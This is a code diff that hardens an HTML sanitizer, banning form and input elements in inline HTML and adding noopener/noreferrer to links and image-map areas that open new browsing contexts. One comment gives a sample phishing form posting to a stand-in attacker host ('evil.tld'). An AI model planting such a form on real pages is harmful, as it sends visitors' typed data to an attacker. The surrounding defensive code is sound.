@@ -71,7 +71,19 @@ const forbiddenTags = ['base', 'embed', 'link', 'meta', 'object', 'script']
 const inlineSanitizeOptions = {
   ADD_ATTR: ['rel', 'target'],
   FORBID_ATTR: ['srcdoc'],
-  FORBID_TAGS: forbiddenTags,
+  // Inline HTML is a narrow slot for an ICP number, friend links, or a support
+  // mailbox, none of which need a form. Allowing one leaves a phishing surface
+  // the script blocking above does not cover: a plain
+  // `<form action="https://evil.tld">` POSTs whatever a visitor types to an
+  // attacker-chosen origin without a line of script.
+  FORBID_TAGS: [
+    ...forbiddenTags,
+    'button',
+    'form',
+    'input',
+    'select',
+    'textarea',
+  ],
 } satisfies Config
 
 const isolatedSanitizeOptions = {
@@ -102,6 +114,14 @@ const isolatedSanitizeOptions = {
   FORCE_BODY: true,
 } satisfies Config
 
+// Targets that reuse the current browsing context; an empty value behaves like
+// `_self`. Every other target — `_blank` or any author-chosen frame name — opens
+// a new context that inherits `window.opener`, which is all reverse tabnabbing
+// needs, so `rel` hardening cannot key off `_blank` alone. The match is ASCII
+// case-insensitive but otherwise literal, so the raw value must not be trimmed
+// first: ` _self ` is a frame name rather than the keyword.
+const sameContextLinkTargets = new Set(['', '_parent', '_self', '_top'])
+
 function hardenSanitizedHtml(
   html: string,
   variant: HtmlContentVariant
@@ -113,15 +133,26 @@ function hardenSanitizedHtml(
   const template = document.createElement('template')
   template.innerHTML = html
 
-  template.content.querySelectorAll('a[target="_blank"]').forEach((link) => {
-    const rel = new Set(
-      link.getAttribute('rel')?.split(/\s+/).filter(Boolean) ?? []
-    )
+  // `<area>` follows the same hyperlink rules as `<a>` and carries the same
+  // `target`/`rel` pair, so an image map hotspot opens an opener-linked context
+  // exactly like a link does.
+  template.content
+    .querySelectorAll('a[target], area[target]')
+    .forEach((link) => {
+      const target = link.getAttribute('target')?.toLowerCase() ?? ''
 
-    rel.add('noopener')
-    rel.add('noreferrer')
-    link.setAttribute('rel', [...rel].join(' '))
-  })
+      if (sameContextLinkTargets.has(target)) {
+        return
+      }
+
+      const rel = new Set(
+        link.getAttribute('rel')?.split(/\s+/).filter(Boolean) ?? []
+      )
+
+      rel.add('noopener')
+      rel.add('noreferrer')
+      link.setAttribute('rel', [...rel].join(' '))
+    })
 
   if (variant === 'isolated') {
     template.content.querySelectorAll('iframe').forEach((frame) => {
